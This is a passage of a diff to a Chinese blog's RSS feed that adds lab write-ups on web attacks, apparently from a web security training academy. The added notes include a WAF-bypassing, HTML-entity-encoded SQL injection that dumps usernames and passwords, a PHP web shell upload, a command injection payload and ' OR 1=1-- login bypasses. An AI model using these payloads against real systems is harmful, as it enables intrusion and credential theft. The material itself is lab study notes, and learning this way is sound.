class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)+FROM+dual--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后看子域名即可&lt;/p&gt;
+&lt;h3 id=&#34;其他场景的注入&#34;&gt;其他场景的注入
+&lt;/h3&gt;&lt;h4 id=&#34;xml-编码绕过-waf&#34;&gt;XML 编码绕过 WAF
+&lt;/h4&gt;&lt;p&gt;1.注入点：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;2&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;2.测试：改为 &lt;code&gt;1 union select null&lt;/code&gt; ，发现被检查出攻击了，有 waf。将内容进行 html 实体编码，发现绕过了。再测试，发现只能返回一行，所以需要拼接字符串。&lt;/p&gt;
+&lt;p&gt;3.payload：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;2&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1 UNION SELECT username || &amp;#39;~&amp;#39; || password FROM users&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;把&lt;code&gt;1 UNION SELECT username || &#39;~&#39; || password FROM users&lt;/code&gt; 编码为&lt;code&gt;&amp;amp;#49;&amp;amp;#32;&amp;amp;#85;&amp;amp;#78;&amp;amp;#73;&amp;amp;#79;&amp;amp;#78;&amp;amp;#32;&amp;amp;#83;&amp;amp;#69;&amp;amp;#76;&amp;amp;#69;&amp;amp;#67;&amp;amp;#84;&amp;amp;#32;&amp;amp;#117;&amp;amp;#115;&amp;amp;#101;&amp;amp;#114;&amp;amp;#110;&amp;amp;#97;&amp;amp;#109;&amp;amp;#101;&amp;amp;#32;&amp;amp;#124;&amp;amp;#124;&amp;amp;#32;&amp;amp;#39;&amp;amp;#126;&amp;amp;#39;&amp;amp;#32;&amp;amp;#124;&amp;amp;#124;&amp;amp;#32;&amp;amp;#112;&amp;amp;#97;&amp;amp;#115;&amp;amp;#115;&amp;amp;#119;&amp;amp;#111;&amp;amp;#114;&amp;amp;#100;&amp;amp;#32;&amp;amp;#70;&amp;amp;#82;&amp;amp;#79;&amp;amp;#77;&amp;amp;#32;&amp;amp;#117;&amp;amp;#115;&amp;amp;#101;&amp;amp;#114;&amp;amp;#115;&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>PVE的lxc环境下搭建grist表格</title>
         <link>https://calendar0917.github.io/posts/devops-lxc%E4%B8%AD%E6%90%AD%E5%BB%BAgrist/</link>
         <pubDate>Thu, 20 Nov 2025 00:00:00 +0000</pubDate>
@@ -421,6 +1046,74 @@
 &lt;p&gt;&lt;strong&gt;Lab1&lt;/strong&gt; 普通的文件上传&lt;/p&gt;
 &lt;p&gt;上传了 &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt; 后访问，改一下 cmd 读取密码就可以了。结果 echo + cat 了两遍……有回显时不需要外层的 echo。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Lab2&lt;/strong&gt; MIME 绕过&lt;/p&gt;
+&lt;p&gt;改一下 MIME 类型就可以了&lt;/p&gt;
+&lt;h2 id=&#34;命令注入&#34;&gt;命令注入
+&lt;/h2&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;命令用途&lt;/th&gt;
+          &lt;th&gt;Linux 命令&lt;/th&gt;
+          &lt;th&gt;Windows 命令&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;当前用户名&lt;/td&gt;
+          &lt;td&gt;whoami&lt;/td&gt;
+          &lt;td&gt;whoami&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;操作系统信息&lt;/td&gt;
+          &lt;td&gt;uname -a&lt;/td&gt;
+          &lt;td&gt;ver&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;网络配置&lt;/td&gt;
+          &lt;td&gt;ifconfig&lt;/td&gt;
+          &lt;td&gt;ipconfig /all&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;网络连接情况&lt;/td&gt;
+          &lt;td&gt;netstat -an&lt;/td&gt;
+          &lt;td&gt;netstat -an&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;正在运行的进程&lt;/td&gt;
+          &lt;td&gt;ps -ef&lt;/td&gt;
+          &lt;td&gt;tasklist&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;在注入的命令后添加额外的命令分隔符 &lt;code&gt;&amp;amp;&lt;/code&gt; 很有用，因为它能将注入的命令与注入点之后的内容分开，用于测试注入点。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Lab&lt;/strong&gt; 命令注入&lt;/p&gt;
+&lt;p&gt;找到的注入点是 &lt;code&gt;productId=2&amp;amp;storeId=1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先尝试最常用的命令分隔符，优先级一般是：&lt;code&gt;|&lt;/code&gt; &amp;gt; &lt;code&gt;;&lt;/code&gt; &amp;gt; &lt;code&gt;&amp;amp;&lt;/code&gt; &amp;gt; &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; &amp;gt; &lt;code&gt;||&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;于是 payload 为：&lt;code&gt;productId=2&amp;amp;storeId=1|whoami&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sql注入&#34;&gt;SQL注入
+&lt;/h2&gt;&lt;p&gt;手动检测 SQL 注入，需对应用的每个输入点进行系统性测试，通常要提交这些内容：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;单引号&lt;code&gt;&#39;&lt;/code&gt;，观察是否出现错误或异常；&lt;/li&gt;
+&lt;li&gt;能让输入点返回原值 / 不同值的 SQL 语法，看应用响应是否有规律差异；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;OR 1=1&lt;/code&gt;、&lt;code&gt;OR 1=2&lt;/code&gt;这类布尔条件，观察响应变化；&lt;/li&gt;
+&lt;li&gt;会触发 SQL 查询延迟的载荷，对比响应耗时差异；&lt;/li&gt;
+&lt;li&gt;能触发带外网络交互的 OAST 载荷，同时监控交互情况。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;另外，用 Burp Scanner 可以快速、可靠地发现大部分 SQL 注入漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;--&lt;/code&gt; 是注释符，后面的语句会被省略&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用 &lt;code&gt;OR 1=1&lt;/code&gt; 时要小心，如果时删除或更新语句，会造成觉察不到的错误。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Lab&lt;/strong&gt; SQL闭合&lt;/p&gt;
+&lt;p&gt;题目给的语句：&lt;code&gt;SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;注入点：&lt;code&gt;/filter?category=Clothing%2c+shoes+and+accessories&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先把查询的拼进去，就是：&lt;code&gt;...WHERE category = &#39;Clothing &amp;lt;...&amp;gt;&#39; AND released = 1 &lt;/code&gt; ,然后再想怎么注入。&lt;/p&gt;
+&lt;p&gt;把引号闭合，再把后面的 and 注释掉，payload 为：&lt;code&gt;&#39;+OR+1=1--&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在 URL 中，&lt;strong&gt;空格&lt;/strong&gt;不能直接传输（会被解析为参数分隔符），因此需要用&lt;code&gt;+&lt;/code&gt;或&lt;code&gt;%20&lt;/code&gt;做 URL 编码，后端接收到后会自动解码为空格。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Lab&lt;/strong&gt; 用户名-密码校验&lt;/p&gt;
+&lt;p&gt;password payload:&lt;code&gt;&#39; OR 1=1--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;注意，如果要注入在 username 的话，也可以&lt;/p&gt;
 </description>
         </item>
         <item>
